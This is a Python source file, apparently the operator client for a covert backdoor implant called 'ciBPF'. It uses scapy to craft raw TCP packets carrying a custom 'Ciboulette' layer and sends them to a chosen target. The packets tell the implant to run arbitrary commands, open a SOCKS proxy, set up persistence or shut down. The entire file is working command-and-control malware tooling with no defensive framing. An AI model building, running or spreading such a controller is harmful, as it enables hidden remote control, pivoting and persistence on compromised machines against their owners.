from scapy.all import *
from ciboulette import Ciboulette
import argparse


class Client:

    ACTIONS = { "EXEC_CMD": 0x01, "RUN_SOCKS": 0x02, "KILL": 0x03, "PERSIST": 0x04 }
    
    def __init__(self, ip: str() = None, port: int() = None):
        self.ip = ip
        self.port = port

    def generate_packet(self, action: int() = None, command: str() = None):
        if action == "EXEC_CMD":
            if command != None:
                packet = IP(dst=self.ip)/TCP(dport=self.port)/Ciboulette(action=self.ACTIONS["EXEC_CMD"], lenght=len(command), command=command)
            else:
                print("Error. 'command' cannot be null for action EXEC_CMD.")
                exit(1)
        elif action == "RUN_SOCKS":
            packet = IP(dst=self.ip)/TCP(dport=self.port)/Ciboulette(action=self.ACTIONS["RUN_SOCKS"])
        elif action == "KILL":
            packet = IP(dst=self.ip)/TCP(dport=self.port)/Ciboulette(action=self.ACTIONS["KILL"])
        elif action == "PERSIST":
            packet = IP(dst=self.ip)/TCP(dport=self.port)/Ciboulette(action=self.ACTIONS["PERSIST"])
        else:
            print(f"Error. 'action' cannot be null")
            exit(1)
        return packet

    def send_packet(self, packet):
        print(packet.show(dump=True))
        send(packet)
    

def getargs():
    parser = argparse.ArgumentParser(prog="ciBPF client", description="A python client for communicate with ciBPF")
    parser.add_argument('--target-ip', '-t', required=True, type=str, help='target ip')
    parser.add_argument('--target-port', '-p', required=True, type=int, help='target port')
    parser.add_argument('--action', '-a', choices=["EXEC_CMD", "RUN_SOCKS", "KILL", "PERSIST"], required=True, type=str, help='The action to perfom')
    parser.add_argument('--command', '-c', default=None, type=str, help='The command to be executed by ciBPF')

    return parser.parse_args()


def main():
    args = getargs()
    target_ip = args.target_ip
    target_port = args.target_port
    action = args.action
    command = args.command

    client = Client(target_ip, target_port)    
    packet = client.generate_packet(action=action, command=command)
 
    client.send_packet(packet)


if __name__ == '__main__':
    main()
